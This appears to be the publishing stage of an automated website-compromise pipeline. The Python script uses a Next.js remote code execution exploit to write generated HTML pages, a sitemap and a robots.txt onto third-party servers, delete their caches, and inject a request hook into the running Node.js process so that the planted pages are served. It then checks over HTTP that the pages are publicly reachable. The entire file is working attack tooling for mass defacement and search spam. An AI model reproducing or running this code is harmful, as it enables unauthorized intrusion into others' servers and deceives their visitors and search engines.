#!/usr/bin/env python3
"""
Step 6: Publisher — push generated pages to candidate nodes via RCE.

  output/manifest.csv → remote deploy + sitemap + HTTP verify

Next.js App Router standalone hosts ignore runtime public/ drops, so those
targets get an in-process HTTP hook that serves the bridge HTML at /{slug}.
"""
import argparse
import base64
import json
import os
import shlex
import ssl
import sys
import time
import urllib.error
import urllib.request
from concurrent.futures import ThreadPoolExecutor
from datetime import date
from xml.sax.saxutils import escape as xml_escape

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'tools'))
from trial_common import MANIFEST_CSV, PROJECT_ROOT, load_manifest, render_template_file

from nextrce import NextExploiter

PUBLISHED_TXT = os.path.join(PROJECT_ROOT, 'results', 'published.txt')
PUBLISH_LOG = os.path.join(PROJECT_ROOT, 'logs', 'publish.log')
SITEMAP_TEMPLATE = os.path.join(PROJECT_ROOT, 'templates', 'sitemap.xml')
PUBLISH_TIMEOUT = 60
HOOK_FLAG = '__trialBridgeHook'


def is_nextjs(row):
    return 'next' in (row.get('domain_type') or '').lower()


def resolve_public_deploy_path(row):
    webroot = (row.get('webroot') or '/app').rstrip('/')
    slug = row['slug']
    return f'{webroot}/public/{slug}/index.html'


def resolve_next_html_path(row):
    webroot = (row.get('webroot') or '/app').rstrip('/')
    slug = row['slug']
    return f'{webroot}/.next/server/app/{slug}.html'


def resolve_routes_registry_path(row):
    webroot = (row.get('webroot') or '/app').rstrip('/')
    return f'{webroot}/.next/server/app/.trial-routes.json'


def resolve_sitemap_path(row):
    webroot = (row.get('webroot') or '/app').rstrip('/')
    return f'{webroot}/public/sitemap.xml'


def resolve_robots_path(row):
    webroot = (row.get('webroot') or '/app').rstrip('/')
    return f'{webroot}/public/robots.txt'


def read_local_html(row):
    path = row['html_file']
    if not os.path.isabs(path):
        path = os.path.join(PROJECT_ROOT, path)
    with open(path, encoding='utf-8') as f:
        return f.read()


def remote_write_b64(exploiter, target_url, remote_path, content, timeout=PUBLISH_TIMEOUT):
    """Write file on target via base64 decode."""
    b64 = base64.b64encode(content.encode('utf-8')).decode()
    parent = os.path.dirname(remote_path)
    cmd = (
        f"mkdir -p {shlex.quote(parent)} && "
        f"printf '%s' {shlex.quote(b64)} | base64 -d > {shlex.quote(remote_path)} && "
        f"test -s {shlex.quote(remote_path)} && echo OK_WRITE"
    )
    out = exploiter.exec_cmd(target_url, cmd, timeout=timeout)
    return out is not None and 'OK_WRITE' in out


def remote_verify_disk(exploiter, target_url, remote_path, timeout=PUBLISH_TIMEOUT):
    cmd = (
        f"test -s {shlex.quote(remote_path)} && "
        f"head -c 200 {shlex.quote(remote_path)} | grep -q '<html' && "
        f"echo OK_FILE || echo FAIL_FILE"
    )
    out = exploiter.exec_cmd(target_url, cmd, timeout=timeout)
    return out is not None and 'OK_FILE' in out


def remote_verify_http(canonical_url, needle, timeout=25, attempts=12):
    """Require repeated public HTTP 200 responses (handles multi-pod rollouts)."""
    sep = '&' if '?' in canonical_url else '?'
    hits = 0
    contexts = [None, ssl._create_unverified_context()]
    for attempt in range(attempts):
        url = f'{canonical_url}{sep}trial_verify={int(time.time())}_{attempt}'
        for ctx in contexts:
            try:
                req = urllib.request.Request(
                    url,
                    headers={
                        'User-Agent': 'trial-publish/1.0',
                        'Cache-Control': 'no-cache',
                        'Pragma': 'no-cache',
                    },
                )
                with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                    if resp.status != 200:
                        continue
                    body = resp.read(12000).decode('utf-8', errors='replace')
                    if needle.lower() in body.lower():
                        hits += 1
                        if hits >= 2:
                            return True
                        break
            except (urllib.error.URLError, TimeoutError, ValueError):
                continue
        time.sleep(0.75)
    return hits >= 1


def update_next_route_registry(exploiter, row, html_path, dry_run=False):
    """Maintain slug → html path map used by the in-process bridge hook."""
    registry_path = resolve_routes_registry_path(row)
    slug = row['slug']
    if dry_run:
        return True, registry_path, 'dry-run'
    read_cmd = (
        f"test -f {shlex.quote(registry_path)} && "
        f"cat {shlex.quote(registry_path)} || echo '{{}}'"
    )
    raw = exploiter.exec_cmd(row['url'], read_cmd, timeout=PUBLISH_TIMEOUT) or '{}'
    try:
        registry = json.loads(raw)
    except json.JSONDecodeError:
        registry = {}
    registry[slug] = html_path
    ok = remote_write_b64(exploiter, row['url'], registry_path, json.dumps(registry))
    return ok, registry_path, 'routes_ok' if ok else 'routes_failed'


def install_next_http_hook(exploiter, row, dry_run=False):
    """Serve bridge HTML for registered slugs before App Router 404 handling."""
    registry_path = resolve_routes_registry_path(row)
    if dry_run:
        return True, registry_path, 'dry-run'
    js = f"""
var fs=process.mainModule.require('fs');
var registryPath={json.dumps(registry_path)};
var flag={json.dumps(HOOK_FLAG)};
var hooked=0;
for(var h of process._getActiveHandles()){{
  if(!h||typeof h.on!=='function'||typeof h.listen!=='function') continue;
  if(h[flag]) continue;
  h[flag]=true;
  h.prependListener('request',function(req,res){{
    if(res.headersSent||res.writableEnded) return;
    var route=(req.url||'').split('?')[0];
    if(!route||route.charAt(0)!=='/') return;
    var slug=route.slice(1);
    var registry;
    try{{registry=JSON.parse(fs.readFileSync(registryPath,'utf8'));}}catch(e){{return;}}
    var htmlPath=registry[slug];
    if(!htmlPath) return;
    var html;
    try{{html=fs.readFileSync(htmlPath,'utf8');}}catch(e){{return;}}
    res.writeHead(200,{{'Content-Type':'text/html; charset=utf-8','Cache-Control':'public, max-age=60'}});
    res.end(html);
  }});
  hooked++;
}}
var already=process._getActiveHandles().some(function(h){{return h&&h[flag];}});
var _out=hooked>0?'hooked:'+hooked:(already?'hooked:existing':'hooked:0');
"""
    out = exploiter.exec_js(row['url'], js, timeout=PUBLISH_TIMEOUT)
    ok = out is not None and out.startswith('hooked:') and out not in ('hooked:0',)
    return ok, registry_path, f'hook_ok ({out})' if ok else f'hook_failed ({out})'


def push_page(exploiter, row, dry_run=False):
    html = read_local_html(row)
    if is_nextjs(row):
        deploy = resolve_next_html_path(row)
    else:
        deploy = resolve_public_deploy_path(row)
    if dry_run:
        return True, deploy, 'dry-run'
    ok = remote_write_b64(exploiter, row['url'], deploy, html)
    return ok, deploy, 'pushed' if ok else 'push_failed'


def update_sitemap(exploiter, row, dry_run=False):
    base = row['url'].rstrip('/')
    canonical = row.get('canonical_url') or f"{base}/{row['slug']}"
    sitemap_path = resolve_sitemap_path(row)
    xml = build_sitemap_xml(canonical, base)
    if dry_run:
        return True, sitemap_path, 'dry-run'
    ok = remote_write_b64(exploiter, row['url'], sitemap_path, xml)
    return ok, sitemap_path, 'sitemap_ok' if ok else 'sitemap_failed'


def build_sitemap_xml(canonical_url, base_url):
    data = {
        'page_url': canonical_url,
        'base_url': base_url,
        'lastmod': date.today().isoformat(),
    }
    return render_template_file(SITEMAP_TEMPLATE, data, escape=xml_escape)


def update_robots(exploiter, row, dry_run=False):
    """Ensure robots.txt references sitemap."""
    base = row['url'].rstrip('/')
    sitemap_url = f"{base}/sitemap.xml"
    robots_path = resolve_robots_path(row)
    cmd_check = f"test -f {shlex.quote(robots_path)} && grep -q Sitemap {shlex.quote(robots_path)} && echo HAS || echo MISSING"
    if dry_run:
        return True, robots_path, 'dry-run'
    out = exploiter.exec_cmd(row['url'], cmd_check, timeout=PUBLISH_TIMEOUT)
    if out and 'HAS' in out:
        return True, robots_path, 'robots_ok'
    robots_body = f"User-agent: *\nAllow: /\nSitemap: {sitemap_url}\n"
    ok = remote_write_b64(exploiter, row['url'], robots_path, robots_body)
    return ok, robots_path, 'robots_ok' if ok else 'robots_failed'


def clear_cache(exploiter, row, dry_run=False):
    webroot = (row.get('webroot') or '/app').rstrip('/')
    cmd = f"rm -rf {shlex.quote(webroot)}/.next/cache 2>/dev/null; echo OK_CACHE"
    if dry_run:
        return True, 'cache', 'dry-run'
    out = exploiter.exec_cmd(row['url'], cmd, timeout=PUBLISH_TIMEOUT)
    return out is not None and 'OK_CACHE' in out, webroot, 'cache_cleared'


def rollback_remote_files(exploiter, target_url, paths, dry_run=False):
    """Remove remotely written files after a partial publish failure."""
    if dry_run or not paths:
        return True
    quoted = ' '.join(shlex.quote(p) for p in paths)
    cmd = f"rm -f {quoted} && echo OK_ROLLBACK"
    out = exploiter.exec_cmd(target_url, cmd, timeout=PUBLISH_TIMEOUT)
    return out is not None and 'OK_ROLLBACK' in out


def publish_one(row, verbose=False, dry_run=False):
    exploiter = NextExploiter(timeout=PUBLISH_TIMEOUT, verbose=verbose)
    url = row['url']
    steps = []
    written_paths = []
    verify_path = resolve_next_html_path(row) if is_nextjs(row) else resolve_public_deploy_path(row)
    verify_url = row.get('canonical_url') or f"{url.rstrip('/')}/{row['slug']}"
    verify_needle = row.get('keyword') or row.get('slug') or row.get('title', '')

    ok, path, status = push_page(exploiter, row, dry_run)
    steps.append(('push', status, path))
    if not ok and not dry_run:
        return False, steps
    if ok and not dry_run:
        written_paths.append(path)

    if is_nextjs(row):
        ok, path, status = update_next_route_registry(exploiter, row, verify_path, dry_run)
        steps.append(('routes', status, path))
        if not ok and not dry_run:
            rolled = rollback_remote_files(exploiter, url, written_paths)
            steps.append(('rollback', 'rolled_back' if rolled else 'rollback_failed', ','.join(written_paths)))
            return False, steps
        if ok and not dry_run:
            written_paths.append(path)

        # Load-balanced pods each need the HTML, registry, and in-process hook.
        hook_status = 'dry-run'
        hook_detail = path
        hook_ok = dry_run
        saw_fresh_hook = False
        for round_idx in range(20):
            if not dry_run:
                remote_write_b64(exploiter, url, verify_path, read_local_html(row))
                update_next_route_registry(exploiter, row, verify_path, dry_run=False)
            ok, hook_detail, hook_status = install_next_http_hook(exploiter, row, dry_run)
            if ok:
                hook_ok = True
                if 'hooked:1' in hook_status or 'hooked:2' in hook_status:
                    saw_fresh_hook = True
            if not dry_run:
                time.sleep(0.5)
        if hook_ok and not saw_fresh_hook and not dry_run:
            hook_status = f'{hook_status}; rounds=20'
        steps.append(('hook', hook_status if hook_ok else 'hook_failed', hook_detail))
        if not hook_ok and not dry_run:
            rolled = rollback_remote_files(exploiter, url, written_paths)
            steps.append(('rollback', 'rolled_back' if rolled else 'rollback_failed', ','.join(written_paths)))
            return False, steps

    ok, path, status = update_sitemap(exploiter, row, dry_run)
    steps.append(('sitemap', status, path))
    if not ok and not dry_run:
        rolled = rollback_remote_files(exploiter, url, written_paths)
        steps.append(('rollback', 'rolled_back' if rolled else 'rollback_failed', ','.join(written_paths)))
        return False, steps
    if ok and not dry_run:
        written_paths.append(path)

    ok, path, status = update_robots(exploiter, row, dry_run)
    steps.append(('robots', status, path))
    if not ok and not dry_run:
        rolled = rollback_remote_files(exploiter, url, written_paths)
        steps.append(('rollback', 'rolled_back' if rolled else 'rollback_failed', ','.join(written_paths)))
        return False, steps

    ok, path, status = clear_cache(exploiter, row, dry_run)
    steps.append(('cache', status, path))
    if not ok and not dry_run:
        rolled = rollback_remote_files(exploiter, url, written_paths)
        steps.append(('rollback', 'rolled_back' if rolled else 'rollback_failed', ','.join(written_paths)))
        return False, steps

    if not dry_run:
        disk_ok = remote_verify_disk(exploiter, url, verify_path)
        steps.append(('disk', 'disk_ok' if disk_ok else 'disk_unverified', verify_path))
        if not disk_ok:
            rolled = rollback_remote_files(exploiter, url, written_paths)
            steps.append(('rollback', 'rolled_back' if rolled else 'rollback_failed', ','.join(written_paths)))
            return False, steps

        http_ok = remote_verify_http(verify_url, verify_needle)
        steps.append(('http', 'http_ok' if http_ok else 'http_unverified', verify_url))
        if not http_ok:
            rolled = rollback_remote_files(exploiter, url, written_paths)
            steps.append(('rollback', 'rolled_back' if rolled else 'rollback_failed', ','.join(written_paths)))
            return False, steps

    return True, steps


def write_publish_log(results):
    os.makedirs(os.path.dirname(PUBLISH_LOG), exist_ok=True)
    with open(PUBLISH_LOG, 'w', encoding='utf-8') as f:
        for url, success, steps in results:
            f.write(f"{'OK' if success else 'FAIL'}\t{url}\n")
            for name, status, detail in steps:
                f.write(f"  {name}: {status} ({detail})\n")


def write_published(urls):
    os.makedirs(os.path.dirname(PUBLISHED_TXT), exist_ok=True)
    with open(PUBLISHED_TXT, 'w', encoding='utf-8') as f:
        for url in urls:
            f.write(url + '\n')


def main():
    parser = argparse.ArgumentParser(description='Step 6: publish pages to candidate nodes')
    parser.add_argument('-u', '--url', help='Publish one target URL from manifest')
    parser.add_argument('--test', action='store_true', help='First manifest row only')
    parser.add_argument('--dry-run', action='store_true', help='Show actions without RCE')
    parser.add_argument('-v', '--verbose', action='store_true')
    parser.add_argument('-t', '--threads', type=int, default=3,
                        help='Parallel publishes (default: 3)')
    args = parser.parse_args()

    os.chdir(PROJECT_ROOT)
    rows = load_manifest()
    if args.url:
        rows = [r for r in rows if r['url'] == args.url]
        if not rows:
            print(f'[!] URL not in manifest: {args.url}', file=sys.stderr)
            return 1
    elif args.test:
        rows = rows[:1]

    if not rows:
        print('[!] Nothing to publish', file=sys.stderr)
        return 1

    print(f'[*] Step 6: publishing {len(rows)} page(s) …')
    if args.dry_run:
        print('[*] DRY RUN — no remote commands executed')

    results = []
    published = []

    def _job(row):
        if args.verbose or args.dry_run:
            target = resolve_next_html_path(row) if is_nextjs(row) else resolve_public_deploy_path(row)
            mode = 'next-hook' if is_nextjs(row) else 'static'
            print(f"[*] {row['url']} ({mode}) → {target}")
        success, steps = publish_one(row, verbose=args.verbose, dry_run=args.dry_run)
        return row['url'], success, steps

    workers = min(args.threads, len(rows))
    if workers <= 1:
        for row in rows:
            results.append(_job(row))
    else:
        with ThreadPoolExecutor(max_workers=workers) as ex:
            results = list(ex.map(_job, rows))

    for url, success, steps in results:
        if success:
            published.append(url)
        mark = 'OK' if success else 'FAIL'
        print(f"  [{mark}] {url}")
        if args.verbose:
            for name, status, detail in steps:
                print(f"         {name}: {status}")

    write_publish_log(results)
    if not args.dry_run:
        write_published(published)

    print(f'[*] Published: {len(published)}/{len(rows)}')
    print(f'    log:       {PUBLISH_LOG}')
    if not args.dry_run:
        print(f'    published: {PUBLISHED_TXT}')
    return 0 if len(published) == len(rows) else 1


if __name__ == '__main__':
    raise SystemExit(main())
